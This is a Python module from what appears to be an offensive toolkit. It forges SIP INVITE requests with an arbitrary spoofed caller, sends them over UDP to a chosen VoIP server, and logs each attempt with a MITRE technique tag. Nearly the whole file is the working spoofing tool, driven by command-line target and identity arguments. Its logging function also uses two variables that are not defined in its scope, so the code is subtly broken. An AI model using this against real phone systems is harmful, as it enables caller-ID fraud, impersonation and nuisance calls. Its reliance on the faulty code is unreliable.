# modules/exploits/sip_invite_spoofer.py

import socket
import argparse
import datetime
import json
import os

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1595.002"  # Active Scanning: VoIP

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def craft_invite(target_ip, target_port, from_user, to_user, domain):
    invite = (
        f"INVITE sip:{to_user}@{domain} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP attacker.local;branch=z9hG4bK123456\r\n"
        f"Max-Forwards: 70\r\n"
        f"From: <sip:{from_user}@{domain}>;tag=1234\r\n"
        f"To: <sip:{to_user}@{domain}>\r\n"
        f"Call-ID: {datetime.datetime.utcnow().timestamp()}@attacker.local\r\n"
        f"CSeq: 1 INVITE\r\n"
        f"Contact: <sip:{from_user}@attacker.local>\r\n"
        f"Content-Length: 0\r\n\r\n"
    )
    return invite

def send_invite(ip, port, invite_data):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(invite_data.encode(), (ip, port))
    sock.settimeout(3.0)
    try:
        data, _ = sock.recvfrom(1024)
        print(f"[✓] Response from {ip}:{port} → {data.decode(errors='ignore')[:60]}...")
    except socket.timeout:
        print(f"[!] No response from {ip}:{port}")
    sock.close()

    log_event({
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "target": f"{ip}:{port}",
        "from_user": from_user,
        "to_user": to_user,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SIP INVITE Spoofer")
    parser.add_argument("--ip", required=True, help="Target SIP server IP")
    parser.add_argument("--port", type=int, default=5060, help="SIP port (default: 5060)")
    parser.add_argument("--from-user", required=True, help="Spoofed SIP FROM user")
    parser.add_argument("--to-user", required=True, help="Target SIP TO user")
    parser.add_argument("--domain", required=True, help="SIP domain")
    args = parser.parse_args()

    invite = craft_invite(args.ip, args.port, args.from_user, args.to_user, args.domain)
    send_invite(args.ip, args.port, invite)
